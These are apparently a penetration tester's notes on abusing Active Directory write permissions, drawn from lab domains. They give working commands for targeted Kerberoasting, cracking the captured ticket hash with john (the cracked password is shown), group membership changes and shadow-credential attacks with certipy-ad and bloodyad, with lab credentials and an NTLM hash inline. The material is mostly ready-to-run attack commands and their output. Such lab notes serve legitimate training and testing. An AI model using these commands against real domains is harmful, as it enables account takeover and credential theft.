
- This permission allows you to perform a targeted Kerberoasting attack.
- By leveraging the write access, you can add a temporary SPN (Service Principal Name) to the jerri_lancaster account.
- Once the SPN is added, you can request a service ticket for that account and then carry out the usual Kerberoasting process (offline password cracking)

---
## PoC

Added an SPN to for user "jerry_lancaster" temporarily and retrieved his TGT.

```
python3 targetedKerberoast.py -v -d 'thm.local' -u 'ZACHARY_HUNT' -p 'MKO)mko0' --dc-host ad.thm.local --request-user JERRI_LANCASTER
```

Bruteforced an password out of the TGT

```
john jerri_lancaster --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
lovinlife!       (?)     
1g 0:00:00:00 DONE (2026-05-14 14:18) 3.333g/s 2085Kp/s 2085Kc/s 2085KC/s lrcjks..love2cook
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

---
## 2. Method: Shadow Credentials

It is often more saver to utilize shadow creds instead of changing the password to avoid lockout or being to loud. 

Adding current user to the group using "BloodyAD".

```
bloodyad -u p.agila -p prometheusx-303 -d fluffy.htb -H 10.129.19.236 add groupmember 'service accounts' p.agila
```

Abusing GenericWrite to an service account and requesting NTLM Hash.

```
certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p prometheusx-303 -account winrm_svc -dc-ip 10.129.19.236
```

or with bloodyad

```
bloodyad --host 10.129.232.75 -d puppy.htb -u levi.james -p 'KingofAkron2025!' add shadowCredentials adam.silver
```

---

Shadow Credential Attack NTLM Auth

```
certipy-ad shadow auto -u 'management_svc@certified.htb' -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -dc-ip 10.129.231.186
```